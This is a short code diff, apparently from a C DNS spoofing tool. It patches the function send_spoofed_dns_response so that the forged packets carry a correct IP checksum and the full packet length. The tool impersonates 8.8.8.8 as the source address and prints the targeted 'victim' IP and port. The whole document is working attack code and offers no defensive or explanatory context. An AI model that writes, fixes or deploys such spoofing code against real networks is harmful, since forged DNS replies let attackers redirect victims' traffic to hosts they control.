@@ -176,7 +176,7 @@ send_spoofed_dns_response(u_char	*dns_req,
     	iph->saddr = inet_addr("8.8.8.8");      
     	iph->daddr = *dest_ip;
 	
-	//iph->crc = csum((unsigned short *)dns_res, htons(iph->tlen)); 
+	iph->crc = csum((unsigned short *)dns_res, ip_len/*htons(iph->tlen)*/); 
 	// ==========
 	
 	memcpy(dns_res + ip_len + 8, dns_req, len);
@@ -234,7 +234,7 @@ send_spoofed_dns_response(u_char	*dns_req,
 	printf("\nVictim IP address = %s\t", temp);
 	printf("Port = %d\n", ntohs(victim_addr.sin_port));
 
-	status = sendto(soc, dns_res, len + sizeof(dns_response) + 8, 0, 
+	status = sendto(soc, dns_res, len + sizeof(dns_response) + 8 + ip_len, 0, 
 			(struct sockaddr *)&victim_addr, sizeof(victim_addr));
 	if (status < 0) {
 		printf("\nUnable to send packet to victim %d !\n", errno);
